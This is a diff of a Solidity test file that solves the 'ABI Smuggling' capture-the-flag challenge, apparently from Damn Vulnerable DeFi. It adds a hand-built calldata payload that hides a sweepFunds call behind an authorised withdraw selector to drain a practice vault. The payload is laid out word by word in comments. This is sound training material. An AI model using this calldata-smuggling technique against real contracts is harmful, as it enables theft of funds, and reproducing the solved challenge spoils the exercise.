@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,19 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // 1cff79cd
+        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+        // 0000000000000000000000000000000000000000000000000000000000000064
+        // 0000000000000000000000000000000000000000000000000000000000000000
+        // d9caed12
+        // 0000000000000000000000000000000000000000000000000000000000000044
+        // 85fb709d
+        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
+        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+        // 000000000000000000000000000000000000000000000000
+        bytes memory payload =
+            hex"1cff79cd0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000d9caed12000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b000000000000000000000000000000000000000000000000";
+        address(vault).call(payload);
     }
 
     /**
@@ -83,5 +95,13 @@ contract ABISmugglingChallenge is Test {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    } // 0x85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+
+    function _getRevertReason(bytes memory returndata) internal pure returns (string memory) {
+        if (returndata.length < 68) return "Unknown revert reason";
+        assembly {
+            returndata := add(returndata, 0x04)
+        }
+        return abi.decode(returndata, (string));
     }
 }
